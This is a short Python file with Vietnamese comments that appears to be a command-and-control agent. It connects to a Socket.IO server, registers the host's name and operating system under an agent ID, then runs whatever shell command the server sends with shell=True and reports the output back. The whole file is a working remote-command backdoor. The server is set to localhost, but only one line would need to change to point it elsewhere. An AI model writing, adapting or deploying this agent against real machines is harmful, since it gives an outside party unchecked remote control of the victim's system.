import socketio
import time
import platform 
import subprocess

# khoi tao client (dien thoai)
sio = socketio.Client()

# cau hinh server (tong dai)
SERVER_URL = 'http://localhost:80'
AGENT_ID = 'agent_007' 

# dinh nghia cac su kien (nghe tin hieu)
@sio.event
def connect():
    print("[+] connected to server successfully!")
    
    # ngay khi ket noi, gui thong tin dang ky ngay
    info = {
        "agent_id": AGENT_ID,
        "hostname": platform.node(),
        "os": platform.system()
    }
    sio.emit('register', info) 

@sio.event
def server_ack(data):
    # nghe server xac nhan
    print(f"[v] server ack: {data}")

@sio.event
def execute_command(data):
    # lay lenh tu server gui xuong
    command_text = data.get('cmd')
    print(f"[*] received command: {command_text}")

    result = ""
    try:
        # thuc thi lenh va gop loi (stderr) vao ket qua (stdout)
        output = subprocess.check_output(command_text, shell=True, stderr=subprocess.STDOUT)
        
        # giai ma tu bytes sang string
        result = output.decode('utf-8', errors='replace')
        
    except subprocess.CalledProcessError as e:
        # truong hop lenh chay nhung tra ve ma loi
        result = e.output.decode('utf-8', errors='replace')
    except Exception as e:
        # cac loi khac (vi du code python sai)
        result = str(e)

    print(f"[+] execution result:\n{result}")

    # gui ket qua nguoc tro lai server
    sio.emit('command_result', {'result': result, 'agent_id': AGENT_ID})

@sio.event
def disconnect():
    print("[-] disconnected from server.")

# thuc hien ket noi (bam so goi)
def main():
    print(f"[*] attempting connection to {SERVER_URL}...")
    try:
        sio.connect(SERVER_URL)
        sio.wait() # giu ket noi luon mo
    except Exception as e:
        print(f"[!] connection error: {e}")

if __name__ == '__main__':
    main()